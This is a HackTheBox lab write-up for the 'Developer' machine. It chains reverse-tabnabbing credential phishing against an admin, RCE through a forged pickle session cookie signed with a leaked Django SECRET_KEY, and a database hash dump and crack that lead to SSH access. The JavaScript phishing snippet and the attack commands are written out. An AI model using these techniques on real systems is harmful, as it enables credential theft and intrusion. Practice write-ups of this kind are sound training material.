---
title: "Developer"
date: 2026-12-17 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, django, sentry, tabnabbing, insecure-deserialization, pickle]
image:
    path: /assets/Images/Developer-avatar.png
    alt: Developer
description: "Phishing an admin via reverse tabnabbing, then forging a pickle-serialized Sentry session cookie with a leaked Django SECRET_KEY for RCE, and cracking a Django hash for the user shell."
---
## Overview

Developer is a hard Linux box fronted by a Django CTF platform and a Sentry error-monitoring instance. The foothold chains a reverse-tabnabbing phish (to steal an admin password) with a Django/Sentry pickle-deserialization RCE (from a leaked `SECRET_KEY`), then a database hash crack to land a real user shell. This post covers recon through `user.txt`.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 233.7,122.8 162.9,167.8 98.3,221.2 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Realistic web chain (reverse tabnabbing phish plus leaked Django SECRET_KEY) dominated by custom effort manually forging a SHA1-signed pickle session cookie for RCE, with little CVE reliance and only moderate enumeration.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | login shell present |
| 80/tcp | Apache 2.4.41 | redirects to `developer.htb` (Django CTF platform) |

```bash
nmap -sC -sV 10.129.5.227
```

Port 80 redirects to `developer.htb`. Add it to `/etc/hosts`. The site is a CTF platform where you register, solve challenges, and submit "writeups" — submitted writeup links are reviewed by an admin, which is the hook.

```bash
echo "10.129.5.227 developer.htb developer-sentry.developer.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Submitting a writeup link pointing at your own HTTP server confirms the admin clicks it. Cookie-stealing XSS fails (Django marks the session cookie HttpOnly), but the writeup link is rendered with `target="_blank"` and no `rel="noopener"` — classic **reverse tabnabbing**. A malicious page opened in the new tab keeps a `window.opener` handle to the admin's original tab and can redirect it.

The admin panel (after foothold) exposes a second site under Django's Sites framework: `developer-sentry.developer.htb`, a Sentry instance.

## Foothold

**1 — Phish the admin (reverse tabnabbing).** Host a writeup page that redirects the opener to a cloned login, and a cloned `developer.htb` login page (CSS/JS sourced from the real host so it looks identical) that logs the POSTed credentials:

```html
<!-- writeup.html -->
<script>
if (window.opener) window.opener.location.replace('http://<lhost>/accounts/login/');
</script>
```

The admin opens the writeup, his original tab silently becomes a fake "you've been logged out" login, and he re-enters credentials → `jacob : <redacted>`.

**2 — Leak the Sentry SECRET_KEY.** Log into Django `/admin` as jacob, then into Sentry as `jacob@developer.htb`. Creating and then deleting a project triggers a debug page that exposes the Django `SECRET_KEY` and confirms the session uses the **Pickle** serializer.

**3 — Forge a pickle session cookie for RCE.** Sentry's `sentrysid` cookie is `base64(pickle):base62(timestamp):sha1_hmac`, signed with the `SECRET_KEY`. Owning the key lets you sign an arbitrary pickle whose `__reduce__` returns `os.system(<cmd>)`. Note: old Sentry signs with **SHA1**, so a modern Django library (SHA256) would be rejected — sign manually. Verify the key against the live anonymous cookie first, then forge:

```bash
# verify SECRET_KEY by re-signing the live sentrysid cookie, then:
python3 forge.py "<cmd>"   # -> b64(pickle):b62(ts):sha1_hmac
curl -s "http://developer-sentry.developer.htb/" -H 'Cookie: sentrysid="<forged_cookie>"'
```

Refreshing with the forged cookie executes the command as `www-data`.

## User flag

As `www-data`, read the Sentry DB creds from `/etc/sentry/sentry.conf.py` and dump the user hashes from PostgreSQL:

```bash
PGPASSWORD=<redacted> psql -h localhost -d sentry -U sentry -t -c "select username,password from auth_user;"
```

`karl`'s `pbkdf2_sha256` hash cracks against rockyou (hashcat mode 10000), and he reuses the password for SSH:

```bash
hashcat -m 10000 karl.hash /usr/share/wordlists/rockyou.txt   # -> <redacted>
sshpass -p '<redacted>' ssh karl@10.129.5.227
cat /home/karl/user.txt   # HTB{...}
```

Shell as `karl` and the user flag captured.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Developer-avatar.png" alt="Developer" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
